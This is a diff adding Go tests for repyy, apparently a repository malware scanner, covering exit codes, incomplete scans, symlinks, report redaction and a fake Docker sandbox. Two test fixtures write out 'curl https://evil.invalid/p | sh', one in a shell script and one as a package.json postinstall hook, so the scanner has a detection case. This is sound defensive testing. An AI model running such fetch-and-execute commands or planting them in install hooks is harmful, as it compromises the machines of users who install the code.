@@ -9,7 +9,11 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/Kevin-Umali/repyy/internal/intel"
 	"github.com/Kevin-Umali/repyy/internal/model"
+	"github.com/Kevin-Umali/repyy/internal/output"
+	"github.com/Kevin-Umali/repyy/internal/sandbox"
+	"github.com/Kevin-Umali/repyy/internal/scan"
 )
 
 func TestMultipleTargetsAndFlagsAfterTargets(t *testing.T) {
@@ -61,6 +65,79 @@ func TestOperationalFailureWinsExitCode(t *testing.T) {
 	}
 	if code != 2 {
 		t.Fatalf("exit = %d, want 2", code)
+	}
+}
+
+func TestIncompleteCoverageReturnsOperationalFailure(t *testing.T) {
+	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
+	incomplete, clean := t.TempDir(), t.TempDir()
+	for _, name := range []string{"first.txt", "second.txt", "third.txt", "fourth.txt"} {
+		if err := os.WriteFile(filepath.Join(incomplete, name), []byte("fixture\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	for _, name := range []string{"README.md", "LICENSE"} {
+		if err := os.WriteFile(filepath.Join(clean, name), []byte("fixture\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+
+	var stdout bytes.Buffer
+	code, err := Run([]string{"scan", incomplete, clean, "--max-files", "3", "--format=json", "--progress=quiet"}, &stdout, &bytes.Buffer{}, "test")
+	if err != nil || code != 2 {
+		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
+	}
+
+	var report model.Report
+	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
+		t.Fatal(err)
+	}
+	if len(report.Results) != 2 || report.Results[0].Verdict != model.VerdictIncomplete || report.Results[0].Coverage.Complete || report.Results[1].Verdict != model.VerdictNoFindings {
+		t.Fatalf("unexpected results: %+v", report.Results)
+	}
+}
+
+func TestUndecodableScriptExitsIncomplete(t *testing.T) {
+	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
+	root := t.TempDir()
+	if err := os.WriteFile(filepath.Join(root, "run.sh"), []byte("#!/bin/sh\n#\x00\ncurl https://evil.invalid/p | sh\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	var stdout bytes.Buffer
+	code, err := Run([]string{"scan", root, "--format=json", "--progress=quiet"}, &stdout, &bytes.Buffer{}, "test")
+	if err != nil || code != 2 {
+		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
+	}
+	var report model.Report
+	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
+		t.Fatal(err)
+	}
+	if len(report.Results) != 1 || report.Results[0].Verdict != model.VerdictIncomplete || report.Results[0].Coverage.Complete {
+		t.Fatalf("undecodable script appeared clean: %+v", report.Results)
+	}
+}
+
+func TestDirectorySymlinkKeepsRequestedNameAndFindings(t *testing.T) {
+	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
+	root := t.TempDir()
+	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(`{"scripts":{"postinstall":"curl https://evil.invalid/p | sh"}}`), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	link := filepath.Join(t.TempDir(), "review")
+	if err := os.Symlink(root, link); err != nil {
+		t.Skipf("directory symlink unavailable: %v", err)
+	}
+	var stdout bytes.Buffer
+	code, err := Run([]string{"scan", link, "--format=json", "--progress=quiet"}, &stdout, &bytes.Buffer{}, "test")
+	if err != nil || code != 1 {
+		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
+	}
+	var report model.Report
+	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
+		t.Fatal(err)
+	}
+	if len(report.Results) != 1 || report.Results[0].Target != link || report.Results[0].Coverage.FilesScanned == 0 || len(report.Results[0].Findings) == 0 {
+		t.Fatalf("symlink target lost scan findings: %+v", report.Results)
 	}
 }
 
@@ -203,7 +280,7 @@ func TestReportConvertsLegacyJSONToSelfContainedHTML(t *testing.T) {
 		t.Fatal(err)
 	}
 	code, err := Run([]string{"report", input, "--output", result}, &bytes.Buffer{}, &bytes.Buffer{}, "test")
-	if err != nil || code != 0 {
+	if err != nil || code != 1 {
 		t.Fatalf("code=%d err=%v", code, err)
 	}
 	html, err := os.ReadFile(result)
@@ -221,6 +298,132 @@ func TestReportConvertsLegacyJSONToSelfContainedHTML(t *testing.T) {
 		if info.Mode().Perm() != 0o600 {
 			t.Fatalf("report mode = %o, want 600", info.Mode().Perm())
 		}
+	}
+}
+
+func TestReportRejectsForgedVerdictAndPreservesExitPolicy(t *testing.T) {
+	report := model.Report{SchemaVersion: "1", Results: []model.RepoResult{{
+		Target: "fixture", Verdict: model.VerdictNoFindings, Coverage: model.Coverage{Complete: true},
+		Findings: []model.Finding{{RuleID: "TEST-001", Path: "main.js", Severity: model.SeverityHigh, Confidence: model.ConfidenceHigh, Message: "danger"}},
+	}}}
+	path := filepath.Join(t.TempDir(), "report.json")
+	run := func() (int, error, string) {
+		t.Helper()
+		data, err := json.Marshal(report)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(path, data, 0o600); err != nil {
+			t.Fatal(err)
+		}
+		var output bytes.Buffer
+		code, err := Run([]string{"report", path, "--format", "terminal", "--color", "never"}, &output, &bytes.Buffer{}, "test")
+		return code, err, output.String()
+	}
+	if code, err, output := run(); code != 3 || err == nil || !strings.Contains(err.Error(), "verdict") || output != "" {
+		t.Fatalf("forged clean verdict: code=%d err=%v output=%q", code, err, output)
+	}
+	report.Results[0].Verdict = model.VerdictReview
+	if code, err, output := run(); code != 1 || err != nil || !strings.Contains(output, "REVIEW REQUIRED") {
+		t.Fatalf("high finding: code=%d err=%v output=%q", code, err, output)
+	}
+	report.Results[0].Coverage.Complete = false
+	report.Results[0].Verdict = model.VerdictIncomplete
+	if code, err, output := run(); code != 2 || err != nil || !strings.Contains(output, "SCAN INCOMPLETE") {
+		t.Fatalf("incomplete report: code=%d err=%v output=%q", code, err, output)
+	}
+}
+
+func TestReportConversionRedactsSourceDerivedMessage(t *testing.T) {
+	token := "ghp_" + strings.Repeat("A", 36)
+	report := model.Report{
+		SchemaVersion: "1", ToolVersion: "test", RulesVersion: "test-rules",
+		Intelligence: model.IntelligenceInfo{Version: "test-intel", Date: "2026-09-12", Source: "embedded"},
+		Results: []model.RepoResult{{Target: "fixture", Verdict: model.VerdictReview, Coverage: model.Coverage{Complete: true},
+			Findings: []model.Finding{{RuleID: "PKG-007", Category: "package-script", Severity: model.SeverityHigh, Confidence: model.ConfidenceMedium, Context: "manifest-hook", Path: "package.json", Message: "Suspicious script: " + token, Evidence: "redacted", Fingerprint: "sha256:test"}}}},
+	}
+	data, err := json.Marshal(report)
+	if err != nil {
+		t.Fatal(err)
+	}
+	input := filepath.Join(t.TempDir(), "scan.json")
+	if err := os.WriteFile(input, data, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	for _, format := range []string{"html", "sarif", "terminal"} {
+		var stdout bytes.Buffer
+		code, err := Run([]string{"report", input, "--format", format}, &stdout, &bytes.Buffer{}, "test")
+		if err != nil || code != 1 || strings.Contains(stdout.String(), token) || !strings.Contains(stdout.String(), "REDACTED") {
+			t.Fatalf("%s conversion leaked source text: code=%d err=%v output=%s", format, code, err, stdout.String())
+		}
+	}
+}
+
+func TestReportOutputPreservesExistingFileOnRenderFailure(t *testing.T) {
+	path := filepath.Join(t.TempDir(), "report.html")
+	if err := os.WriteFile(path, []byte("previous report"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if err := writeReportOutput(&bytes.Buffer{}, path, "unsupported", model.Report{}, output.DefaultOptions()); err == nil {
+		t.Fatal("expected render failure")
+	}
+	data, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if string(data) != "previous report" {
+		t.Fatalf("existing report changed: %q", data)
+	}
+}
+
+func TestDockerScanKeepsSuccessfulTargetsAfterAnotherFails(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("fake Docker shell script requires Unix")
+	}
+	t.Setenv("REPYY_CACHE_DIR", t.TempDir())
+	root := t.TempDir()
+	good, bad := filepath.Join(root, "good"), filepath.Join(root, "bad")
+	for _, path := range []string{good, bad} {
+		if err := os.Mkdir(path, 0o700); err != nil {
+			t.Fatal(err)
+		}
+	}
+	worker := model.Report{
+		SchemaVersion: "1", ToolVersion: "test", RulesVersion: scan.BuiltinRulesVersion,
+		Intelligence: model.IntelligenceInfo{Version: intel.SnapshotVersion, Date: intel.SnapshotDate, Source: "embedded"},
+		Results:      []model.RepoResult{{Target: "/input", Verdict: model.VerdictNoFindings, Coverage: model.Coverage{Complete: true}}},
+	}
+	workerJSON, err := json.Marshal(worker)
+	if err != nil {
+		t.Fatal(err)
+	}
+	dockerDir := t.TempDir()
+	workerFile := filepath.Join(dockerDir, "worker.json")
+	if err := os.WriteFile(workerFile, workerJSON, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	script := "#!/bin/sh\ncase \"$*\" in\n  *'image inspect'*) exit 0 ;;\n  *'/bad,'*) exit 125 ;;\n  *) cat \"$FAKE_DOCKER_WORKER\"; exit 0 ;;\nesac\n"
+	if err := os.WriteFile(filepath.Join(dockerDir, "docker"), []byte(script), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	t.Setenv("PATH", dockerDir+string(os.PathListSeparator)+os.Getenv("PATH"))
+	t.Setenv("FAKE_DOCKER_WORKER", workerFile)
+	oldDigest := sandbox.ImageDigest
+	sandbox.ImageDigest = "sha256:" + strings.Repeat("a", 64)
+	defer func() { sandbox.ImageDigest = oldDigest }()
+	var stdout, stderr bytes.Buffer
+	code, err := Run([]string{"scan", good, bad, "--sandbox=docker", "--format=json", "--progress=quiet"}, &stdout, &stderr, "test")
+	if err != nil || code != 2 {
+		t.Fatalf("code=%d err=%v output=%s", code, err, stdout.String())
+	}
+	var report model.Report
+	if err := json.Unmarshal(stdout.Bytes(), &report); err != nil {
+		t.Fatal(err)
+	}
+	if len(report.Results) != 2 || report.Results[0].Target != good || report.Results[1].Target != bad ||
+		report.Results[0].Verdict != model.VerdictNoFindings || report.Results[0].Isolation == nil ||
+		report.Results[1].Verdict != model.VerdictIncomplete || report.Results[1].Error == "" {
+		t.Fatalf("mixed scan results: %+v", report.Results)
 	}
 }
 
